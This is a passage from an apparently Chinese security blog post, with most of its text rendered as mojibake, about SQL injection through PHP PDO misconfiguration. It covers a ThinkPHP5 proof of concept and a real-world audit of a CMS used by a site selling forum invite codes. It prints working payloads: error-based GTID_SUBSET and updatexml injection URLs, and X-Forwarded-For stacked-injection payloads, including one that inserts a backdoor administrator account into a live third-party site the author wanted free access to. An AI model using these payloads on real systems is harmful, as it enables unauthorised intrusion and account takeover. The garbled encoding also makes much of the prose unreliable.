&#125;&#125; catch (PDOException $e) &#123;    echo $e;&#125;</code></pre><p>$roleæ˜¯å¯æ§çš„ï¼Œå¯¼è‡´å¯å®ç°å †å æ³¨å…¥å’Œin line query</p><p><img src="https://i.loli.net/2021/05/26/IbQoJZMV3BEW8xa.png" alt="image-20210526015752434"></p><p><img src="https://i.loli.net/2021/05/26/uxRIAn8C9gWVG5B.png" alt="image-20210526005239112"></p><h4 id="2-3å½“è®¾ç½®PDO-ATTR-ERRMODEå’ŒPDO-ERRMODE-EXCEPTIONå¼€å¯æŠ¥é”™æ—¶"><a href="#2-3å½“è®¾ç½®PDO-ATTR-ERRMODEå’ŒPDO-ERRMODE-EXCEPTIONå¼€å¯æŠ¥é”™æ—¶" class="headerlink" title="2.3å½“è®¾ç½®PDO::ATTR_ERRMODEå’ŒPDO::ERRMODE_EXCEPTIONå¼€å¯æŠ¥é”™æ—¶"></a>2.3å½“è®¾ç½®PDO::ATTR_ERRMODEå’ŒPDO::ERRMODE_EXCEPTIONå¼€å¯æŠ¥é”™æ—¶</h4><p>è®¾ç½®æ–¹æ³•</p><pre><code class="php">$pdo-&gt;setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);</code></pre><p>æ— è®ºæ˜¯å¦å¼€å¯PDO::ATTR_EMULATE_PREPARES-æ¨¡æ‹Ÿé¢„å¤„ç†</p><p>æ­¤æ—¶SQLè¯­å¥å¦‚æœäº§ç”ŸæŠ¥é”™ï¼ŒPDOåˆ™ä¼šå°†æŠ¥é”™æŠ›å‡º</p><p>é™¤è®¾ç½®é”™è¯¯ç ä¹‹å¤–ï¼ŒPDO è¿˜å°†æŠ›å‡ºä¸€ä¸ª PDOException å¼‚å¸¸ç±»å¹¶è®¾ç½®å®ƒçš„å±æ€§æ¥åå°„é”™è¯¯ç å’Œé”™è¯¯ä¿¡æ¯ã€‚</p><p>æ­¤è®¾ç½®åœ¨è°ƒè¯•æœŸé—´ä¹Ÿéå¸¸æœ‰ç”¨ï¼Œå› ä¸ºå®ƒä¼šæœ‰æ•ˆåœ°æ”¾å¤§è„šæœ¬ä¸­äº§ç”Ÿé”™è¯¯çš„ç‚¹ï¼Œä»è€Œå¯ä»¥éå¸¸å¿«é€Ÿåœ°æŒ‡å‡ºä»£ç ä¸­æœ‰é—®é¢˜çš„æ½œåœ¨åŒºåŸŸ</p><p>åœ¨è¿™ç§æƒ…å†µä¸‹å¯ä»¥å®ç°error-based SQL Injection</p><p>ä½¿ç”¨GTID_SUBSETå‡½æ•°è¿›è¡ŒæŠ¥é”™æ³¨å…¥</p><pre><code class="sql">http://192.168.1.3/pdo.php?role=id OR GTID_SUBSET(CONCAT((MID((IFNULL(CAST(CURRENT_USER() AS NCHAR),0x20)),1,190))),6700)&amp;username=admin&amp;username=admin</code></pre><p><img src="https://i.loli.net/2021/05/26/1D5nIJ8tQVkAOHU.png" alt="image-20210526013121010"></p><h4 id="2-4-éæ¨¡æ‹Ÿé¢„å¤„ç†çš„æƒ…å†µ"><a href="#2-4-éæ¨¡æ‹Ÿé¢„å¤„ç†çš„æƒ…å†µ" class="headerlink" title="2.4 éæ¨¡æ‹Ÿé¢„å¤„ç†çš„æƒ…å†µ"></a>2.4 éæ¨¡æ‹Ÿé¢„å¤„ç†çš„æƒ…å†µ</h4><pre><code class="php">&lt;?phptry &#123;    $pdo=new PDO(&#39;mysql:host=localhost;dbname=test&#39;,&#39;root&#39;,&#39;root&#39;);    $pdo-&gt;setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);    $pdo-&gt;setAttribute(PDO::ATTR_EMULATE_PREPARES, false);    $username = $_GET[&#39;username&#39;];    $sql = &quot;select id,&quot;.$_GET[&#39;role&#39;].&quot; from user where username = ?&quot;;    $stmt = $pdo-&gt;prepare($sql);    $stmt-&gt;bindParam(1,$username);    $stmt-&gt;execute();    while($row=$stmt-&gt;fetch(PDO::FETCH_ASSOC))    &#123;        var_dump($row);        echo &quot;&lt;br&gt;&quot;;    &#125;&#125; catch (PDOException $e) &#123;    echo $e;&#125;</code></pre><p>æ­¤æ—¶å †å æ³¨å…¥å·²ç»æ­‡é€¼</p><p><img src="https://i.loli.net/2021/05/26/6AfJC7pE42OZU9I.png" alt="image-20210526015916363"></p><p>ä½†inline queryï¼ŒæŠ¥é”™æ³¨å…¥ä¾ç„¶åšæŒºå¯ç”¨</p><p><img src="https://i.loli.net/2021/05/26/rNZXVoWfLQed74n.png" alt="image-20210526014840025"></p><h3 id="â‘¢ä¸€ä¸ªå®‰å…¨çš„case"><a href="#â‘¢ä¸€ä¸ªå®‰å…¨çš„case" class="headerlink" title="â‘¢ä¸€ä¸ªå®‰å…¨çš„case"></a>â‘¢ä¸€ä¸ªå®‰å…¨çš„case</h3><p>åªè¦è¯­å¥å†…å­˜åœ¨æœ‰ç”¨æˆ·éçº¯å­—ç¬¦å¯æ§éƒ¨åˆ†ï¼Œä¾¿ä¸å¤Ÿå®‰å…¨ï¼›é‚£æˆ‘ä»¬å°±ç”¨éæ¨¡æ‹Ÿé¢„å¤„ç†sqlå†™æ³•</p><pre><code class="php">$dbh-&gt;setAttribute(PDO::ATTR_EMULATE_PREPARES, false); </code></pre><p>å®ƒä¼šå‘Šè¯‰ PDO ç¦ç”¨æ¨¡æ‹Ÿé¢„å¤„ç†è¯­å¥ï¼Œå¹¶ä½¿ç”¨ real parepared statements ã€‚</p><p>è¿™å¯ä»¥ç¡®ä¿SQLè¯­å¥å’Œç›¸åº”çš„å€¼åœ¨ä¼ é€’åˆ°mysqlæœåŠ¡å™¨ä¹‹å‰æ˜¯ä¸ä¼šè¢«PHPè§£æçš„ï¼ˆç¦æ­¢äº†æ‰€æœ‰å¯èƒ½çš„æ¶æ„SQLæ³¨å…¥æ”»å‡»ï¼‰ã€‚</p><p>å¦‚ä¸‹ä¸ºä¸€ä¸ªå®‰å…¨ä½¿ç”¨PDOçš„case</p><pre><code class="php">$pdo = new PDO(&#39;mysql:dbname=testdatabase;host=localhost;charset=utf8&#39;, &#39;root&#39;, &#39;root&#39;);$pdo-&gt;setAttribute(PDO::ATTR_EMULATE_PREPARES, false);$stmt = $pdo-&gt;prepare(&#39;SELECT * FROM wz_admin WHERE id = :id&#39;);$stmt-&gt;execute(array(&#39;id&#39; =&gt; $id));print_r($stmt -&gt; fetchAll ());exit();</code></pre><blockquote><p>å½“è°ƒç”¨ prepare() æ—¶ï¼ŒæŸ¥è¯¢è¯­å¥å·²ç»å‘é€ç»™äº†æ•°æ®åº“æœåŠ¡å™¨ï¼Œæ­¤æ—¶åªæœ‰å ä½ç¬¦  </p><p>å‘é€è¿‡å»ï¼Œæ²¡æœ‰ç”¨æˆ·æäº¤çš„æ•°æ®ï¼›å½“è°ƒç”¨åˆ° execute()æ—¶ï¼Œç”¨æˆ·æäº¤è¿‡æ¥çš„å€¼æ‰ä¼šä¼ é€ç»™æ•°æ®åº“ï¼Œå®ƒä»¬æ˜¯åˆ†å¼€ä¼ é€çš„ï¼Œä¸¤è€…ç‹¬ç«‹çš„ï¼ŒSQLæ³¨å…¥æ”»å‡»è€…æ²¡æœ‰ä¸€ç‚¹æœºä¼š</p></blockquote><h2 id="0x04-æ¡ˆä¾‹å‰–æ-ThinkPHP5ä¸­PDOå¯¼è‡´çš„ä¸€ä¸ªé¸¡è‚‹æ³¨å…¥-æ¥è‡ªPhithonå¸ˆå‚…"><a href="#0x04-æ¡ˆä¾‹å‰–æ-ThinkPHP5ä¸­PDOå¯¼è‡´çš„ä¸€ä¸ªé¸¡è‚‹æ³¨å…¥-æ¥è‡ªPhithonå¸ˆå‚…" class="headerlink" title="0x04 æ¡ˆä¾‹å‰–æ-ThinkPHP5ä¸­PDOå¯¼è‡´çš„ä¸€ä¸ªé¸¡è‚‹æ³¨å…¥(æ¥è‡ªPhithonå¸ˆå‚…)"></a>0x04 æ¡ˆä¾‹å‰–æ-ThinkPHP5ä¸­PDOå¯¼è‡´çš„ä¸€ä¸ªé¸¡è‚‹æ³¨å…¥(æ¥è‡ªPhithonå¸ˆå‚…)</h2><p>æˆ‘ä»¬æ¥çœ‹Phithonå¸ˆå‚…å‡ å¹´å‰åšå®¢å‘çš„ä¸€ä¸ªcase</p><p><a href="https://www.leavesongs.com/PENETRATION/thinkphp5-in-sqlinjection.html">https://www.leavesongs.com/PENETRATION/thinkphp5-in-sqlinjection.html</a></p><pre><code class="php">&lt;?phpnamespace app\index\controller;use app\index\model\User;class Index&#123;    public function index()    &#123;        $ids = input(&#39;ids/a&#39;);        $t = new User();        $result = $t-&gt;where(&#39;id&#39;, &#39;in&#39;, $ids)-&gt;select();    &#125;&#125;</code></pre><p>å¦‚ä¸Šè¿°ä»£ç ï¼Œå¦‚æœæˆ‘ä»¬æ§åˆ¶äº†inè¯­å¥çš„å€¼ä½ç½®ï¼Œå³å¯é€šè¿‡ä¼ å…¥ä¸€ä¸ªæ•°ç»„ï¼Œæ¥é€ æˆSQLæ³¨å…¥æ¼æ´ã€‚</p><p>æ–‡ä¸­å·²æœ‰åˆ†æï¼Œæˆ‘å°±ä¸å¤šè¯´äº†ï¼Œä½†è¯´ä¸€ä¸‹ä¸ºä»€ä¹ˆè¿™æ˜¯ä¸€ä¸ªSQLæ³¨å…¥æ¼æ´ã€‚INæ“ä½œä»£ç å¦‚ä¸‹ï¼š</p><pre><code class="php">&lt;?php...$bindName = $bindName ?: &#39;where_&#39; . str_replace([&#39;.&#39;, &#39;-&#39;], &#39;_&#39;, $field);if (preg_match(&#39;/\W/&#39;, $bindName)) &#123;    // å¤„ç†å¸¦éå•è¯å­—ç¬¦çš„å­—æ®µå    $bindName = md5($bindName);&#125;...&#125; elseif (in_array($exp, [&#39;NOT IN&#39;, &#39;IN&#39;])) &#123;    // IN æŸ¥è¯¢    if ($value instanceof \Closure) &#123;        $whereStr .= $key . &#39; &#39; . $exp . &#39; &#39; . $this-&gt;parseClosure($value);    &#125; else &#123;        $value = is_array($value) ? $value : explode(&#39;,&#39;, $value);        if (array_key_exists($field, $binds)) &#123;            $bind  = [];            $array = [];            foreach ($value as $k =&gt; $v) &#123;                if ($this-&gt;query-&gt;isBind($bindName . &#39;_in_&#39; . $k)) &#123;                    $bindKey = $bindName . &#39;_in_&#39; . uniqid() . &#39;_&#39; . $k;                &#125; else &#123;                    $bindKey = $bindName . &#39;_in_&#39; . $k;                &#125;                $bind[$bindKey] = [$v, $bindType];                $array[]        = &#39;:&#39; . $bindKey;            &#125;            $this-&gt;query-&gt;bind($bind);            $zone = implode(&#39;,&#39;, $array);        &#125; else &#123;            $zone = implode(&#39;,&#39;, $this-&gt;parseValue($value, $field));        &#125;        $whereStr .= $key . &#39; &#39; . $exp . &#39; (&#39; . (empty($zone) ? &quot;&#39;&#39;&quot; : $zone) . &#39;)&#39;;    &#125;</code></pre><p>å¯è§ï¼Œ<code>$bindName</code>åœ¨å‰è¾¹è¿›è¡Œäº†ä¸€æ¬¡æ£€æµ‹ï¼Œæ­£å¸¸æ¥è¯´æ˜¯ä¸ä¼šå‡ºç°æ¼æ´çš„ã€‚ä½†å¦‚æœ<code>$value</code>æ˜¯ä¸€ä¸ªæ•°ç»„çš„æƒ…å†µä¸‹ï¼Œè¿™é‡Œä¼šéå†<code>$value</code>ï¼Œå¹¶å°†<code>$k</code>æ‹¼æ¥è¿›<code>$bindName</code>ã€‚</p><p>ä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬æ§åˆ¶äº†é¢„ç¼–è¯‘SQLè¯­å¥ä¸­çš„é”®åï¼Œä¹Ÿå°±è¯´æˆ‘ä»¬æ§åˆ¶äº†é¢„ç¼–è¯‘çš„SQLè¯­å¥ï¼Œè¿™ç†è®ºä¸Šæ˜¯ä¸€ä¸ªSQLæ³¨å…¥æ¼æ´ã€‚é‚£ä¹ˆï¼Œä¸ºä»€ä¹ˆåŸæ–‡ä¸­è¯´æµ‹è¯•SQLæ³¨å…¥å¤±è´¥å‘¢ï¼Ÿ</p><p>è¿™å°±æ˜¯æ¶‰åŠåˆ°é¢„ç¼–è¯‘çš„æ‰§è¡Œè¿‡ç¨‹äº†ã€‚é€šå¸¸ï¼ŒPDOé¢„ç¼–è¯‘æ‰§è¡Œè¿‡ç¨‹åˆ†ä¸‰æ­¥ï¼š</p><ol><li><code>prepare($SQL)</code> ç¼–è¯‘SQLè¯­å¥</li><li><code>bindValue($param, $value)</code> å°†valueç»‘å®šåˆ°paramçš„ä½ç½®ä¸Š</li><li><code>execute()</code> æ‰§è¡Œ</li></ol><p>è¿™ä¸ªæ¼æ´å®é™…ä¸Šå°±æ˜¯æ§åˆ¶äº†ç¬¬äºŒæ­¥çš„<code>$param</code>å˜é‡ï¼Œè¿™ä¸ªå˜é‡å¦‚æœæ˜¯ä¸€ä¸ªSQLè¯­å¥çš„è¯ï¼Œé‚£ä¹ˆåœ¨ç¬¬äºŒæ­¥çš„æ—¶å€™æ˜¯ä¼šæŠ›å‡ºé”™è¯¯çš„ï¼š</p><p><a href="https://www.leavesongs.com/media/attachment/2017/07/04/d6c994da-94af-4fef-a6c6-584de29f5929.png"><img src="https://www.leavesongs.com/media/attachment/2017/07/04/d6c994da-94af-4fef-a6c6-584de29f5929.cccfdc6225bf.png" alt="sp170704_025805.png"></a></p><p>æ‰€ä»¥ï¼Œè¿™ä¸ªé”™è¯¯â€œä¼¼ä¹â€å¯¼è‡´æ•´ä¸ªè¿‡ç¨‹æ‰§è¡Œä¸åˆ°ç¬¬ä¸‰æ­¥ï¼Œä¹Ÿå°±æ²¡æ³•è¿›è¡Œæ³¨å…¥äº†ã€‚</p><p>ä½†å®é™…ä¸Šï¼Œåœ¨é¢„ç¼–è¯‘çš„æ—¶å€™ï¼Œä¹Ÿå°±æ˜¯ç¬¬ä¸€æ­¥å³å¯åˆ©ç”¨ã€‚æˆ‘ä»¬å¯ä»¥åšæœ‰ä¸€ä¸ªå®éªŒã€‚ç¼–å†™å¦‚ä¸‹ä»£ç ï¼š</p><pre><code class="PHP">&lt;?php$params = [    PDO::ATTR_ERRMODE           =&gt; PDO::ERRMODE_EXCEPTION,    PDO::ATTR_EMULATE_PREPARES  =&gt; false,];$db = new PDO(&#39;mysql:dbname=cat;host=127.0.0.1;&#39;, &#39;root&#39;, &#39;root&#39;, $params);try &#123;    $link = $db-&gt;prepare(&#39;SELECT * FROM table2 WHERE id in (:where_id, updatexml(0,concat(0xa,user()),0))&#39;);&#125; catch (\PDOException $e) &#123;    var_dump($e);&#125;</code></pre><p>æ‰§è¡Œå‘ç°ï¼Œè™½ç„¶æˆ‘åªè°ƒç”¨äº†prepareå‡½æ•°ï¼Œä½†åŸSQLè¯­å¥ä¸­çš„æŠ¥é”™å·²ç»æˆåŠŸæ‰§è¡Œï¼š</p><p><a href="https://www.leavesongs.com/media/attachment/2017/07/04/52d04bac-33d8-4c8e-be6c-5ed5878fa387.png"><img src="https://www.leavesongs.com/media/attachment/2017/07/04/52d04bac-33d8-4c8e-be6c-5ed5878fa387.f4586aaea04f.png" alt="sp170704_032524.png"></a></p><p>ç©¶å…¶åŸå› ï¼Œæ˜¯å› ä¸ºæˆ‘è¿™é‡Œè®¾ç½®äº†<code>PDO::ATTR_EMULATE_PREPARES =&gt; false</code>ã€‚</p><p>è¿™ä¸ªé€‰é¡¹æ¶‰åŠåˆ°PDOçš„â€œé¢„å¤„ç†â€æœºåˆ¶ï¼šå› ä¸ºä¸æ˜¯æ‰€æœ‰æ•°æ®åº“é©±åŠ¨éƒ½æ”¯æŒSQLé¢„ç¼–è¯‘ï¼Œæ‰€ä»¥PDOå­˜åœ¨â€œæ¨¡æ‹Ÿé¢„å¤„ç†æœºåˆ¶â€ã€‚å¦‚æœè¯´å¼€å¯äº†æ¨¡æ‹Ÿé¢„å¤„ç†ï¼Œé‚£ä¹ˆPDOå†…éƒ¨ä¼šæ¨¡æ‹Ÿå‚æ•°ç»‘å®šçš„è¿‡ç¨‹ï¼ŒSQLè¯­å¥æ˜¯åœ¨æœ€å<code>execute()</code>çš„æ—¶å€™æ‰å‘é€ç»™æ•°æ®åº“æ‰§è¡Œï¼›å¦‚æœæˆ‘è¿™é‡Œè®¾ç½®äº†<code>PDO::ATTR_EMULATE_PREPARES =&gt; false</code>ï¼Œé‚£ä¹ˆPDOä¸ä¼šæ¨¡æ‹Ÿé¢„å¤„ç†ï¼Œå‚æ•°åŒ–ç»‘å®šçš„æ•´ä¸ªè¿‡ç¨‹éƒ½æ˜¯å’ŒMysqläº¤äº’è¿›è¡Œçš„ã€‚</p><p>éæ¨¡æ‹Ÿé¢„å¤„ç†çš„æƒ…å†µä¸‹ï¼Œå‚æ•°åŒ–ç»‘å®šè¿‡ç¨‹åˆ†ä¸¤æ­¥ï¼šç¬¬ä¸€æ­¥æ˜¯prepareé˜¶æ®µï¼Œå‘é€å¸¦æœ‰å ä½ç¬¦çš„sqlè¯­å¥åˆ°mysqlæœåŠ¡å™¨ï¼ˆparsing-&gt;resolutionï¼‰ï¼Œç¬¬äºŒæ­¥æ˜¯å¤šæ¬¡å‘é€å ä½ç¬¦å‚æ•°ç»™mysqlæœåŠ¡å™¨è¿›è¡Œæ‰§è¡Œï¼ˆå¤šæ¬¡æ‰§è¡Œoptimization-&gt;executionï¼‰ã€‚</p><p>è¿™æ—¶ï¼Œå‡è®¾åœ¨ç¬¬ä¸€æ­¥æ‰§è¡Œ<code>prepare($SQL)</code>çš„æ—¶å€™æˆ‘çš„SQLè¯­å¥å°±å‡ºç°é”™è¯¯äº†ï¼Œé‚£ä¹ˆå°±ä¼šç›´æ¥ç”±mysqlé‚£è¾¹æŠ›å‡ºå¼‚å¸¸ï¼Œä¸ä¼šå†æ‰§è¡Œç¬¬äºŒæ­¥ã€‚æˆ‘ä»¬çœ‹çœ‹ThinkPHP5çš„é»˜è®¤é…ç½®ï¼š</p><pre><code class="php">...// PDOè¿æ¥å‚æ•°protected $params = [    PDO::ATTR_CASE              =&gt; PDO::CASE_NATURAL,    PDO::ATTR_ERRMODE           =&gt; PDO::ERRMODE_EXCEPTION,    PDO::ATTR_ORACLE_NULLS      =&gt; PDO::NULL_NATURAL,    PDO::ATTR_STRINGIFY_FETCHES =&gt; false,    PDO::ATTR_EMULATE_PREPARES  =&gt; false,];...</code></pre><p>å¯è§ï¼Œè¿™é‡Œçš„ç¡®è®¾ç½®äº†<code>PDO::ATTR_EMULATE_PREPARES =&gt; false</code>ã€‚æ‰€ä»¥ï¼Œç»ˆä¸Šæ‰€è¿°ï¼Œæˆ‘æ„é€ å¦‚ä¸‹POCï¼Œå³å¯åˆ©ç”¨æŠ¥é”™æ³¨å…¥ï¼Œè·å–user()ä¿¡æ¯ï¼š</p><p><a href="http://localhost/thinkphp5/public/index.php?ids%5B0,updatexml(0,concat(0xa,user()),0)%5D=1231">http://localhost/thinkphp5/public/index.php?ids[0,updatexml(0,concat(0xa,user()),0)]=1231</a></p><p><a href="https://www.leavesongs.com/media/attachment/2017/07/04/2d22af8c-04ec-4b7d-9fb3-0709ae5c4ab0.png"><img src="https://www.leavesongs.com/media/attachment/2017/07/04/2d22af8c-04ec-4b7d-9fb3-0709ae5c4ab0.679dfef54084.png" alt="sp170704_021313.png"></a></p><p>ä½†æ˜¯ï¼Œå¦‚æœä½ å°†user()æ”¹æˆä¸€ä¸ªå­æŸ¥è¯¢è¯­å¥ï¼Œé‚£ä¹ˆç»“æœåˆä¼šçˆ†å‡º<code>Invalid parameter number: parameter was not defined</code>çš„é”™è¯¯ã€‚</p><p>å› ä¸ºæ²¡æœ‰è¿‡å¤šç ”ç©¶ï¼Œè¯´ä¸€ä¸‹æˆ‘çŒœæµ‹ï¼šé¢„ç¼–è¯‘çš„ç¡®æ˜¯mysqlæœåŠ¡ç«¯è¿›è¡Œçš„ï¼Œä½†æ˜¯é¢„ç¼–è¯‘çš„è¿‡ç¨‹æ˜¯ä¸æ¥è§¦æ•°æ®çš„ ï¼Œä¹Ÿå°±æ˜¯è¯´ä¸ä¼šä»è¡¨ä¸­å°†çœŸå®æ•°æ®å–å‡ºæ¥ï¼Œæ‰€ä»¥ä½¿ç”¨å­æŸ¥è¯¢çš„æƒ…å†µä¸‹ä¸ä¼šè§¦å‘æŠ¥é”™ï¼›è™½ç„¶é¢„ç¼–è¯‘çš„è¿‡ç¨‹ä¸æ¥è§¦æ•°æ®ï¼Œä½†ç±»ä¼¼user()è¿™æ ·çš„æ•°æ®åº“å‡½æ•°çš„å€¼è¿˜æ˜¯å°†ä¼šç¼–è¯‘è¿›SQLè¯­å¥ï¼Œæ‰€ä»¥è¿™é‡Œæ‰§è¡Œå¹¶çˆ†äº†å‡ºæ¥ã€‚</p><h2 id="0x05-å®æˆ˜æ¡ˆä¾‹-ä»clç¤¾åŒºæ¿€æ´»ç åˆ°Git-2000-Staré¡¹ç›®0day"><a href="#0x05-å®æˆ˜æ¡ˆä¾‹-ä»clç¤¾åŒºæ¿€æ´»ç åˆ°Git-2000-Staré¡¹ç›®0day" class="headerlink" title="0x05 å®æˆ˜æ¡ˆä¾‹-ä»clç¤¾åŒºæ¿€æ´»ç åˆ°Git 2000+ Staré¡¹ç›®0day"></a>0x05 å®æˆ˜æ¡ˆä¾‹-ä»clç¤¾åŒºæ¿€æ´»ç åˆ°Git 2000+ Staré¡¹ç›®0day</h2><h4 id="5-1-èµ·å› "><a href="#5-1-èµ·å› " class="headerlink" title="5.1 èµ·å› "></a>5.1 èµ·å› </h4><p>æŒ–SRCï¼Œåšé¡¹ç›®åšçš„å¿ƒç”Ÿçƒ¦é—·ï¼Œå‰å‡ æ—¥å¿ä¸ä½åœ¨å®¶çœ‹1024(cl)ç¤¾åŒºï¼Œè¶Šçœ‹è¶Šæ¥åŠ²ï¼Œé‚ªç«æ”»å¿ƒï¼Œæƒ³æœç‰‡çœ‹</p><p>å¥ˆä½•clç¤¾åŒºä¸€å‘å¥‰è¡Œé‚€è¯·åˆ¶ï¼Œé‚€è¯·ç åˆå¾ˆéš¾æåˆ°ï¼Œå¯è°“è®©äººååˆ†ä¸çˆ½</p><p>äºæ˜¯æœ¬äººå»googleä¸Šæ‰¾äº†ä¸€ä¸ªå–1024ç¤¾åŒºé‚€è¯·ç çš„ç«™</p><p><img src="https://i.loli.net/2021/05/26/s43NVSmyUhGxlP2.png" alt="image-20210526023044553"></p><p>88å—é’±â€¦.è™½ç„¶ä¸ç®—è´µï¼Œä½†å”®å–è¿™ç§ä¸œè¥¿æœ¬æ¥å°±æ˜¯ä¸å—æ³•å¾‹ä¿æŠ¤çš„ã€‚ä½œä¸ºä¸€ä¸ªJBå°å­ï¼Œæ€ä¹ˆå¯èƒ½ä¸åŠ¨ç‚¹ç™½å«–å¿ƒæ€ï¼Ÿ</p><p>åœ¨é»‘ç›’æµ‹è¯•äº†ä¸€æ®µæ—¶é—´åï¼Œå‘ç°æ”¯ä»˜é€»è¾‘å’Œå‰å°éƒ½æ²¡ä»€ä¹ˆå®‰å…¨é—®é¢˜ã€‚ã€‚éš¾é“æˆ‘çœŸçš„è¦èŠ±é’±ä¹°è¿™æ¿€æ´»ç ï¼Ÿï¼Ÿï¼Ÿï¼Ÿ</p><p>ä¸å¯èƒ½ï¼Œç»å¯¹ä¸å¯èƒ½ã€‚</p><p>çœ‹åˆ°ç½‘ç«™åº•éƒ¨æœ‰ä¸€ä¸ªPowered by xxxï¼Œå‘µå‘µå‘µï¼Œå¥½å®¶ä¼™ï¼Œä¸å‡ºæ„å¤–è¿™åº”è¯¥å°±æ˜¯è¿™ä¸ªç«™ç”¨çš„CMSç³»ç»Ÿäº†</p><p><img src="https://i.loli.net/2021/05/26/WT9bnVZrH5J1dKu.png" alt="image-20210526023227963"></p><p>å»Gitä¸Šä¸€æœï¼Œè¿˜çœŸæœ‰ï¼Œ2000å¤šä¸ªStarï¼Œä½œè€…ç»´æŠ¤äº†å¥½å‡ å¹´ï¼Œä¹Ÿç®—æ˜¯ä¸ªæˆç†Ÿçš„é¡¹ç›®äº†ã€‚</p><p>ç›´æ¥æŠŠæœ€æ–°ç‰ˆæºç ä¸‹è½½ä¸‹æ¥ï¼Œä¸¢è¿›PHPstormé‡Œå¼€å§‹å®¡è®¡</p><h4 id="5-2-ä»å®¡è®¡æ€è·¯åˆ°PDOå¯¼è‡´çš„å‰å°XFFå †å æ³¨å…¥"><a href="#5-2-ä»å®¡è®¡æ€è·¯åˆ°PDOå¯¼è‡´çš„å‰å°XFFå †å æ³¨å…¥" class="headerlink" title="5.2 ä»å®¡è®¡æ€è·¯åˆ°PDOå¯¼è‡´çš„å‰å°XFFå †å æ³¨å…¥"></a>5.2 ä»å®¡è®¡æ€è·¯åˆ°PDOå¯¼è‡´çš„å‰å°XFFå †å æ³¨å…¥</h4><p>å°±æˆ‘ä¸ªäººè€Œè¨€ï¼Œæ‹¿åˆ°ä¸€å¥—æºç ï¼Œæˆ‘æ›´å–œæ¬¢é»‘ç™½ç›’ç›¸ç»“åˆï¼›æ ¹æ®å‰å°èƒ½è®¿é—®åˆ°çš„åŠŸèƒ½ç‚¹æ¥ç¡®å®šè‡ªå·±å®¡è®¡çš„ç›®æ ‡</p><p>ç®€å•çœ‹äº†ä¸€ä¸‹æ•´å¥—ç³»ç»Ÿæ˜¯MVCæ¶æ„çš„ï¼Œä½¿ç”¨äº†PDOï¼Œä½¿ç”¨æœ‰éƒ¨åˆ†è¿‡æ»¤è§„åˆ™ï¼›åå°é»˜è®¤è·¯å¾„æ˜¯&#x2F;admin</p><p>çœ‹äº†ä¸€éå‰å°çš„åŠŸèƒ½ç‚¹ï¼Œå‘ç°åœ¨æŸ¥è¯¢è®¢å•å¤„è·¯å¾„åå¾ˆæœ‰è¶£ï¼Œå¸¦æœ‰ä¸€ä¸ª&#x2F;queryï¼Œç›´æ¥æœä¸€ä¸‹é¡µé¢ä¸Šå…³é”®è¯ï¼Œè·Ÿè¿›å…¥åˆ°æºç ä¸­</p><p><img src="https://i.loli.net/2021/05/26/bhl1B4yESK9C6d8.png" alt="image-20210526024734021"></p><p>å‘ç°äº†å¦‚ä¸‹çš„ä¸€æ®µcode</p><p><img src="https://i.loli.net/2021/05/26/sgoDva5h4QYZIGw.png" alt="image-20210526025356848"></p><p>PDOå‡ä¸ºé»˜è®¤é…ç½®ï¼Œç«‹é©¬æƒ³åˆ°äº†å †å æ³¨å…¥</p><p>ç»æµ‹è¯•orderidç”¨æˆ·å¯æ§ï¼Œå…¨å±€æœç´¢orderidå‘ç°ï¼Œorderidç»å‡½æ•°æ–¹æ³•åè¢«å¤„ç†ä¸ºçº¯å­—ç¬¦ä¸²ï¼Œæ²¡æœ‰æ³¨å…¥ä½™åœ°ï¼Œæ•…é€‰æ‹©å¦è¾Ÿè¹Šå¾„</p><p>åå‘ç°ipå‚æ•°ç”¨æˆ·åŒæ ·å¯æ§ï¼Œåœ¨è°ƒç”¨selectæ–¹æ³•å‰æ²¡åšä»»ä½•å¤„ç†ã€‚</p><p>ipå‚æ•°è°ƒç”¨çš„æ˜¯getClientIPæ–¹æ³•ï¼Œæˆ‘ä»¬è·Ÿä¸€ä¸‹getClientIPæ–¹æ³•</p><p><img src="https://i.loli.net/2021/05/26/hng6kUiuVRmO4aQ.png" alt="image-20210526030817917"></p><p>å¾ˆå¥½ç†è§£ï¼Œå°±æ˜¯ä»å¸¸è§çš„http headerä¸­è·å–å®¢æˆ·ç«¯IP</p><p>ä½†æ˜¯éå¸¸é«˜å…´ï¼Œipå‚æ•°æœªåšä»»ä½•å¤„ç†ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡æ„é€ XFFå¤´æ¥å®ç°å †å æ³¨å…¥</p><p>å› ä¸ºæœ‰csrf_tokençš„æ ¡éªŒï¼Œæˆ‘ä»¬å¿…é¡»åœ¨æŸ¥è¯¢è®¢å•çš„é¡µé¢ï¼Œéšä¾¿è¾“å…¥ä¸ªè®¢å•å·ï¼Œéšåè¾“å…¥æ­£ç¡®çš„éªŒè¯ç ï¼ŒéšåæŸ¥è¯¢æ‰æœ‰æ•ˆ</p><p>éšåæ‰‹åŠ¨æ„é€ XFFå¤´ï¼Œè¿›è¡Œé’ˆå¯¹PDOçš„å †å æ³¨å…¥</p><p>å› ä¸ºPDOå¤„ä¸ºåŒå¼•å·è¿›è¡Œè¯­å¥é—­åˆï¼Œä¸”å±äºæ— å›æ˜¾çš„å †å æ³¨å…¥</p><p>æ•…æ„é€ Payloadä¸º</p><pre><code class="php">X-FORWARDED-For:1&#39;;select sleep(5)#</code></pre><p><img src="https://i.loli.net/2021/05/26/h6Tv1eJEpzQZcKg.png" alt="image-20210526202008945"></p><p>å»¶è¿Ÿäº†5sï¼Œæ³¨å…¥æˆåŠŸã€‚</p><p>é’ˆå¯¹è¿™ç§æ²¡å›æ˜¾çš„å †å æ³¨å…¥ï¼Œç›²æ³¨å¤ªæ…¢ï¼Œç”¨Dnslog OOBåˆå¤ªæ…¢ï¼Œæ‰€ä»¥é€‰æ‹©æ„é€ ä¸€ä¸ªæ·»åŠ åå°ç®¡ç†å‘˜çš„insert payload</p><pre><code class="php">X-FORWARDED-For:1â€œ;insert into t_admin_user values(99,&quot;test@test.test&quot;,&quot;76b1807fc1c914f15588520b0833fbc3&quot;,&quot;78e055&quot;,0);</code></pre><p>ä½†æ˜¯ç°å®æ˜¯å¾ˆæ®‹é…·çš„ï¼Œæµ‹è¯•å‘ç°ï¼Œåœ¨XFFå¤´ä¸­ï¼Œ1â€å°†è¯­å¥é—­åˆååªè¦å‡ºç°äº†å¼•å·æˆ–è€…é€—å·ï¼Œå°±ä¼šå¼•å‘æŠ¥é”™ï¼ŒSQLè¯­å¥æ— 